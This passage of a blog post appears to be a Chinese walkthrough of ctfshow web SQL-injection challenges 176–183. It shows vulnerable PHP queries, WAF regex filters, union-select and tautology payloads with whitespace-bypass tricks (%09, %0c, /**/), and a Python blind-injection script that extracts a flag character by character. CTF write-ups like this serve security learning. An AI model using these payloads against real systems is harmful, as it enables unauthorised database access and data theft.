+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.16.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>获取密码：</p>
+<p>查看目录</p>
+<p>查看api文件夹目录</p>
+<p>读入config.php</p>
+<p>测试连接，添加</p>
+<h1>176</h1>
+<p>查询语句：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure>
+<p>返回逻辑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//对传入的参数进行了过滤</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>   <span class="hljs-comment">//代码过于简单，不宜展示</span><br>  &#125;<br>     <br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/6.1.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/6.2.jpg" srcset="/img/loading.gif" lazyload class="">
+<h1>177 /**/</h1>
+<p>使用176相同的payload，发现不可以，则应该是进行了更严格的过滤</p>
+<p>尝试：</p>
+<p>使用模糊查询→不行</p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-number">-1</span>&#x27; or username like <span class="hljs-string">&quot;%flag%&quot;</span><br></code></pre></td></tr></table></figure>
+<p>常规联合查询→不行</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,&#x27;<span class="hljs-number">3</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+<p>猜测过滤了空格，方法：用注释代替空格→成功</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27;<span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.17.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>查询：（可以用反引号`代替空格？）</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">password</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>ctfshow_user<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>username=<span class="hljs-string">&#x27;flag&#x27;</span>),<span class="hljs-number">3</span>;%23<br></code></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">password</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>ctfshow_user<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>username=<span class="hljs-string">&#x27;flag&#x27;</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/6.3.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>或者使用换行：%0b</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">-1&#x27;u</span>nion%<span class="hljs-number">0b</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>password<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>ctfshow_user<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>username=<span class="hljs-string">&#x27;flag&#x27;</span>),<span class="hljs-number">3</span>;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+<h1>178 %09</h1>
+<p><code>查ascii的Hex列，尝试用其他符号替换空格</code>：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ASCII/309296">ASCII_百度百科 (baidu.com)</a></p>
+<p>过滤：过滤了空格</p>
+<p>绕过：用%09</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27;union<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%091</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%09</span>password<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>ctfshow_user<span class="hljs-variable">%09</span>where<span class="hljs-variable">%09</span>username<span class="hljs-operator">=</span>&#x27;flag&#x27;)<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-comment">;%23</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/8.1.jpg" srcset="/img/loading.gif" lazyload class="">
+<h1>179 %0c</h1>
+<p><strong>解法一</strong></p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;or</span><span class="hljs-symbol">&#x27;1</span><span class="hljs-symbol">&#x27;=</span><span class="hljs-symbol">&#x27;1</span><span class="hljs-symbol">&#x27;%23</span><br></code></pre></td></tr></table></figure>
+<p><strong>解法二</strong></p>
+<p>使用%0c代替空格</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">-<span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%0cunion%</span><span class="hljs-number">0</span>cselect&#x27;<span class="hljs-number">1</span>&#x27;,(select`password`from`ctfshow_user`where`username=&#x27;flag&#x27;),&#x27;<span class="hljs-number">3</span>&#x27;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+<h1>180</h1>
+<p><strong>解法一</strong></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span>cusername<span class="hljs-operator">=</span>&#x27;flag<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/10.1.jpg" srcset="/img/loading.gif" lazyload class="">
+<p><strong>解法二</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27;or(id=<span class="hljs-number">26</span>)and&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-number">-1</span><span class="hljs-symbol">&#x27;%0cor%0c</span><span class="hljs-symbol">&#x27;1</span><span class="hljs-symbol">&#x27;=</span><span class="hljs-symbol">&#x27;1</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/10.2.jpg" srcset="/img/loading.gif" lazyload class="">
+<h1>181</h1>
+<p><strong>题目</strong></p>
+<p>查询语句：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure>
+<p>返回逻辑</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//对传入的参数进行了过滤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br></code></pre></td></tr></table></figure>
+<p><strong>解法一</strong></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span>cusername<span class="hljs-operator">=</span>&#x27;flag<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/11.1.jpg" srcset="/img/loading.gif" lazyload class="">
+<p><strong>解法二</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27;or(id=<span class="hljs-number">26</span>)and&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<h1>182 模糊匹配</h1>
+<p><strong>题目</strong></p>
+<p>返回逻辑</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//对传入的参数进行了过滤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select</span>|<span class="hljs-string">flag/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">      </span><br></code></pre></td></tr></table></figure>
+<p><strong>解法一</strong></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27; <span class="hljs-keyword">or</span> username like <span class="hljs-variable">%fla</span>%<br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span>cusername<span class="hljs-variable">%0</span>clike&#x27;<span class="hljs-variable">%fla</span>%<br></code></pre></td></tr></table></figure>
+<p><strong>解法二</strong></p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">-<span class="hljs-number">1</span>&#x27;or(id=26)and&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<h1>183</h1>
+<p><strong>题目</strong></p>
+<p>查询语句：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>拼接sql语句查找指定ID用户<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(pass) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br></code></pre></td></tr></table></figure>
+<p>返回逻辑：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>拼接sql语句查找指定ID用户<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(pass) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br></code></pre></td></tr></table></figure>
+<p><strong>解法一</strong></p>
+<p>可以传参，使用hackerbar尝试：</p>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.1.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.2.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>不能用flag，因为flag格式是tf开头的？</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">tableName=`ctfshow_user`<span class="hljs-keyword">where</span>`pass`lik<span class="hljs-string">e&#x27;%c%&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>对%进行url编码：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">tableName=`ctfshow_user`<span class="hljs-keyword">where</span>`pass`lik<span class="hljs-string">e&#x27;%25c%25&#x27;</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.3.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>有一条记录，说明这条语句执行成功</p>
+<p>返回的是真/假，可以逐个匹配</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://18f37b19-2326-4077-a901-e980f273b362.challenge.ctf.show/select-waf.php&#x27;</span><br><br>flag_str = <span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnm&#123;&#125;-1234567890&#x27;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">47</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flag_str:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;tableName&#x27;</span>: <span class="hljs-string">&#x27;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&#x27;</span>.<span class="hljs-built_in">format</span>(flag + x)<br>        &#125;<br><br>        response = requests.post(url=url, data=data)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> response.text.find(<span class="hljs-string">&#x27;user_count = 1&#x27;</span>) &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125; is right!&quot;</span>.<span class="hljs-built_in">format</span>(x))<br>            flag += x<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125; is wrong!&quot;</span>.<span class="hljs-built_in">format</span>(x))<br>            <span class="hljs-keyword">continue</span><br>	<span class="hljs-keyword">if</span> flag.find(<span class="hljs-string">&#x27;&#125;&#x27;</span>) &gt; <span class="hljs-number">0</span>:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag:&#x27;</span>, flag)<br>		<span class="hljs-keyword">break</span><br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag:&#x27;</span>, flag)<br></code></pre></td></tr></table></figure>
+<p>结果：</p>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.4.jpg" srcset="/img/loading.gif" lazyload class="">
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctfshow/" class="category-chain-item">ctfshow</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/" title="Lab12-幽灵攻击">
+                        <span class="hidden-mobile">Lab12-幽灵攻击</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Inhaltsverzeichnis</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
